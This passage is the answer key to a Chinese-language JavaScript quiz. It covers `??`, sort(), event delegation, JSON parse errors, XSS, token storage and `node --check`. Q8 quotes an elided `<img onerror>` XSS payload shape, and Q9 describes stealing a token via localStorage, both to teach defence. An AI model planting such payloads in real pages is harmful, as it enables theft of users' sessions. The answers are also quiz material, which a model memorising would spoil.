> 使用者刻意設 `retry: 0`（不重試）或 `timeout: 0`（不逾時），卻被程式偷偷換成預設值。
> `??` 只在左邊是 `null` 或 `undefined` 時才取右邊，所以 B 印出 `0`。
> **需要保留 0 與空字串時一律用 `??`**。
>
> **Q5.** 結果是 `[10, 100, 9]`。
> ★★★★ `sort()` 不給比較函式時會把每個元素**轉成字串**再比字典序，
> 字串比較是逐字元的：`'10'` < `'100'` < `'9'`（因為 `'1'` < `'9'`）。
> 正確寫法 `arr.sort((a, b) => a - b)`。另外要注意 `sort()` 會**就地修改原陣列**，
> 不想動到原始資料就先 `[...arr].sort(...)`。
>
> **Q6.** 用**事件委派**：把監聽器掛在「一定存在、不會被重繪掉」的父層上，
> 再用 `e.target.closest('.del')` 判斷實際點到誰。
> ```javascript
> document.querySelector('#tbl').addEventListener('click', (e) => {
>   const btn = e.target.closest('.del');
>   if (!btn) return;          // ★★★ 沒點到目標就離開
>   刪除(btn.dataset.host);
> });
> ```
> ★★★★ 原本寫法失敗的原因是**執行時機**：那行程式跑的當下，按鈕還不存在，
> `querySelectorAll` 回傳空的 NodeList，`forEach` 一次都沒跑。
> 委派還有兩個附帶好處：只掛一個監聽器（省記憶體）、元素重繪後不用重綁。
>
> **Q7.** ★★★★ 去看 **Network 分頁的那個請求，看它實際回了什麼**。
> 這個錯誤的意思是「我拿到的東西開頭是 `<`，不是 JSON」——
> 通常是伺服器回了 HTML 頁面而不是 JSON，三個常見情境：
> 404 找不到 API（回了錯誤頁）、502/504（回了 Nginx 的錯誤頁）、
> 或 session 過期被導向登入頁。
> 程式面的防禦是先判斷 `if (!res.ok) throw new Error(res.status)` 再 `res.json()`，
> 詳見 [[070-01-04-cmd-前端-JavaScript非同步與API]]。
>
> **Q8.** `textContent` 安全。
> ★★★★★ `innerHTML` 會把字串當 **HTML 解析並執行**，
> 所以 `<img src=x onerror="...">` 這種內容會真的觸發 JS，
> 攻擊者可以藉此讀走 cookie、發出偽造請求 —— 這就是 XSS。
> `textContent` 只把字串當**純文字**放進去，`<img>` 會原樣顯示成文字，不會被解析。
> 同樣的風險出現在 Vue 的 `v-html`、Blade 的 `{!! !!}`、React 的 `dangerouslySetInnerHTML`，
> **看到這些寫法就要停下來確認資料來源**。
>
> **Q9.** 因為 `localStorage` **可以被任何一段 JS 讀取**，
> ★★★★ 只要網站有任何一處 XSS（甚至是被入侵的第三方 CDN 腳本），
> 攻擊者一行 `localStorage.getItem('token')` 就能把 token 送走，而且它是永久保存的。
> 建議改用 **Cookie + `HttpOnly` + `Secure` + `SameSite=Lax`**：
> `HttpOnly` 讓 JS 讀不到（XSS 拿不走）、`Secure` 限制只走 HTTPS、
> `SameSite=Lax` 緩解 CSRF。這三個屬性要一起設才完整。
>
> **Q10.** `node --check app.js`（也可寫 `node -c`）。
> ★★★ 它只做語法解析、**不執行程式**，所以不會因為缺少 DOM 而報錯，
> 很適合放進 CI 或 git pre-commit hook 做第一道把關。
> 有錯時會指出行號與位置：
> ```
> app.js:42
>   const x = {
>             ^
> SyntaxError: Unexpected end of input
> ```
> 注意它抓不到邏輯錯誤與型別錯誤 —— 那要靠 ESLint 與 [[070-01-05-cmd-前端-TypeScript入門]]。

---

## 延伸閱讀

- [[070-01-01-svc-前端-HTML結構與語意]] —— DOM 操作的對象
- [[070-01-02-cmd-前端-CSS版面與排版]] —— 為什麼要改 class 而不是 style
- [[070-01-04-cmd-前端-JavaScript非同步與API]] —— fetch、Promise 與 CORS
- [[070-01-05-cmd-前端-TypeScript入門]] —— 用型別把這篇提到的陷阱擋在編譯期
- [[070-01-07-cmd-前端-瀏覽器開發者工具]] —— Console 與 Network 的完整用法
- MDN JavaScript 指南：<https://developer.mozilla.org/zh-TW/docs/Web/JavaScript/Guide>
